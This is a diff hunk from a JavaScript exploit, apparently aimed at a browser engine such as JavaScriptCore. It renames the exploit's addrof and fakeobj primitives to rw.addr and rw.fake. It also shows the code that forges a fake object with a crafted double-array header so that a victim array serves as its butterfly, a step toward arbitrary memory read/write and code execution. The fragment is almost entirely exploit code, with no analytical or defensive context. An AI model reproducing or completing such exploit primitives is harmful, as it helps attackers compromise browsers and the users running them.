@@ -569,7 +569,7 @@ var VM_PROT_EXECUTE = 0x4
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     
-    print("[+] victim @"+rw.addrof(victim));
+    print("[+] victim @"+rw.addr(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = 0x0108200700001000n;
@@ -579,10 +579,10 @@ var VM_PROT_EXECUTE = 0x4
     };
 
     // create object having |victim| as butterfly.
-    var containerAddr = rw.addrof(container);
+    var containerAddr = rw.addr(container);
     print("[+] container @"+ containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr + 0x10n);
+    var hax = rw.fake(containerAddr + 0x10n);
     var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
